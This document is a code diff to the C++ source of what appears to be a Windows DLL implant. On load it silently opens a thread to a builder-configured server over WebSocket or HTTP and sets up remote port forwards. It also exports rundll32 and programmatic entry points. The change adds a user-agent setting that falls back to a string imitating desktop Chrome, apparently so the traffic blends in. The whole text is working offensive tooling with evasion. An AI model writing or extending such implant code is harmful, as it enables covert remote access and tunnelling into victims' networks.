@@ -21,10 +21,15 @@
 static const std::string DEFAULT_SERVER_URL  = "{{ server_url }}";
 static const std::string DEFAULT_ENCRYPTION_KEY = "{{ encryption_key }}";
 static const std::string DEFAULT_REMOTE_PORT_FORWARDS = "{{ remote_port_forwards }}";
+static const std::string DEFAULT_USER_AGENT = "{{ user_agent }}";
+
+static bool is_placeholder(const std::string& s) {
+    return s.size() >= 5 && s[0] == '{' && s[1] == '{' && s[s.size()-1] == '}' && s[s.size()-2] == '}';
+}
 
 static std::vector<std::string> parse_forwards(const std::string& raw) {
     std::vector<std::string> result;
-    if (raw.empty() || raw == "{{ remote_port_forwards }}") return result;
+    if (raw.empty() || is_placeholder(raw)) return result;
     std::istringstream iss(raw);
     std::string token;
     while (iss >> token) {
@@ -33,8 +38,11 @@ static std::vector<std::string> parse_forwards(const std::string& raw) {
     return result;
 }
 
+static const std::string FALLBACK_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36";
+
 static void run(const std::string& uri_arg, const std::string& key_arg,
-                const std::vector<std::string>& remote_port_forwards) {
+                const std::vector<std::string>& remote_port_forwards,
+                const std::string& user_agent) {
     WSADATA wsa_data;
     if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
         return;
@@ -70,7 +78,7 @@ static void run(const std::string& uri_arg, const std::string& key_arg,
 
         try {
             if (attempt.find("ws") != std::string::npos) {
-                auto ws_client = std::make_unique<WebSocketMessengerClient>(url, encryption_key);
+                auto ws_client = std::make_unique<WebSocketMessengerClient>(url, encryption_key, user_agent);
 
                 for (const auto& config : remote_port_forwards) {
                     auto forwarder = std::make_unique<RemotePortForwarder>(*ws_client, config);
@@ -81,7 +89,7 @@ static void run(const std::string& uri_arg, const std::string& key_arg,
                 client = std::move(ws_client);
                 success = true;
             } else if (attempt.find("http") != std::string::npos) {
-                auto http_client = std::make_unique<HTTPMessengerClient>(url, encryption_key);
+                auto http_client = std::make_unique<HTTPMessengerClient>(url, encryption_key, user_agent);
 
                 for (const auto& config : remote_port_forwards) {
                     auto forwarder = std::make_unique<RemotePortForwarder>(*http_client, config);
@@ -110,10 +118,11 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         DisableThreadLibraryCalls(hModule);
 
         // Only auto-connect if builder has baked in config
-        if (!DEFAULT_ENCRYPTION_KEY.empty() && DEFAULT_ENCRYPTION_KEY != "{{ encryption_key }}") {
+        if (!DEFAULT_ENCRYPTION_KEY.empty() && !is_placeholder(DEFAULT_ENCRYPTION_KEY)) {
             std::thread([]() {
                 auto forwards = parse_forwards(DEFAULT_REMOTE_PORT_FORWARDS);
-                run(DEFAULT_SERVER_URL, DEFAULT_ENCRYPTION_KEY, forwards);
+                std::string ua = is_placeholder(DEFAULT_USER_AGENT) ? FALLBACK_USER_AGENT : DEFAULT_USER_AGENT;
+                run(DEFAULT_SERVER_URL, DEFAULT_ENCRYPTION_KEY, forwards, ua);
             }).detach();
         }
     }
@@ -140,25 +149,28 @@ extern "C" __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, L
     std::string key = args[1];
     std::vector<std::string> forwards(args.begin() + 2, args.end());
 
-    run(uri, key, forwards);
+    run(uri, key, forwards, FALLBACK_USER_AGENT);
 }
 
 // Programmatic entry points
-extern "C" __declspec(dllexport) void Execute(const char* uri, const char* encryption_key) {
-    std::thread([u = std::string(uri), k = std::string(encryption_key)]() {
-        run(u, k, {});
+extern "C" __declspec(dllexport) void Execute(const char* uri, const char* encryption_key,
+                                               const char* user_agent) {
+    std::string ua = (user_agent && user_agent[0]) ? user_agent : FALLBACK_USER_AGENT;
+    std::thread([u = std::string(uri), k = std::string(encryption_key), a = std::move(ua)]() {
+        run(u, k, {}, a);
     }).detach();
 }
 
 extern "C" __declspec(dllexport) void ExecuteWithForwards(
-    const char* uri, const char* encryption_key,
+    const char* uri, const char* encryption_key, const char* user_agent,
     const char** forwards, int forward_count
 ) {
+    std::string ua = (user_agent && user_agent[0]) ? user_agent : FALLBACK_USER_AGENT;
     std::vector<std::string> fwds;
     for (int i = 0; i < forward_count; i++) {
         fwds.emplace_back(forwards[i]);
     }
-    std::thread([u = std::string(uri), k = std::string(encryption_key), f = std::move(fwds)]() {
-        run(u, k, f);
+    std::thread([u = std::string(uri), k = std::string(encryption_key), a = std::move(ua), f = std::move(fwds)]() {
+        run(u, k, f, a);
     }).detach();
 }
